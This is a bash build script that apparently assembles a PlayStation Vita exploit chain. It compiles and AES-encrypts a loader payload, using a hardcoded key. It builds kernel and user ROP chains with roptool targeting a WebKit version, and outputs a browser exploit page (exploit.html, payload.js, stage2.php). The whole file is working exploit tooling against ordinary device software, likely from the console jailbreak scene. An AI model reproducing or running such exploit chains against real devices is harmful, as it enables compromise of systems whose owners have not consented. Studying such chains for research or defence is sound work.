#!/bin/bash

set -ex

# build: tmp build files
# output: final files only, for distribution
rm -rf build output
mkdir build output

echo "1) Payload"

CC=arm-vita-eabi-gcc
LD=arm-vita-eabi-gcc
AS=arm-vita-eabi-as
OBJCOPY=arm-vita-eabi-objcopy
CFLAGS="-fPIE -fno-zero-initialized-in-bss -std=c99 -mcpu=cortex-a9 -Os -mthumb"
LDFLAGS="-T payload/linker.x -nodefaultlibs -nostdlib -pie"
PREPROCESS="$CC -E -P -C -w -x c"

# loader decrypts and lods a larger payload
$CC -c -o build/loader.o payload/loader.c $CFLAGS
$AS -o build/loader_start.o payload/loader_start.S
$LD -o build/loader.elf build/loader.o build/loader_start.o $LDFLAGS
$OBJCOPY -O binary build/loader.elf build/loader.bin

# $CC -c -o build/payload.o payload/payload.c $CFLAGS
# $AS -o build/payload_start.o payload/payload_start.S
# $LD -o build/payload.elf build/payload.o build/payload_start.o $LDFLAGS
# $OBJCOPY -O binary build/payload.elf build/payload.bin

dd if=/dev/zero of=build/pad.bin bs=32 count=1
cat build/pad.bin build/loader.bin > build/loader.full
openssl enc -aes-256-ecb -in build/loader.full -out build/loader.enc -K BD00BF08B543681B6B984708BD00BF0023036018467047D0F8A03043F69D1130

echo "2) Kernel ROP"
./krop/build_rop.py krop/rop.S build/

echo "3) User ROP"
./urop/make_rop_array.py build/loader.enc kx_loader build/kx_loader.rop
$PREPROCESS urop/loader.rop.in -o build/loader.rop
roptool -s build/loader.rop -t webkit-360-pkg -o build/loader.rop.bin -v >/dev/null
$PREPROCESS urop/stage2.rop.in -o build/stage2.rop.in
erb build/stage2.rop.in > build/stage2.rop
roptool -s build/stage2.rop -t webkit-360-pkg -o build/stage2.rop.bin -v >/dev/null

echo "4) Webkit"
cp webkit/exploit.html output/
./webkit/preprocess.py build/loader.rop.bin output/payload.js
cp webkit/stage2.php output/
./webkit/preprocess.py build/stage2.rop.bin output/stage2-payload.php
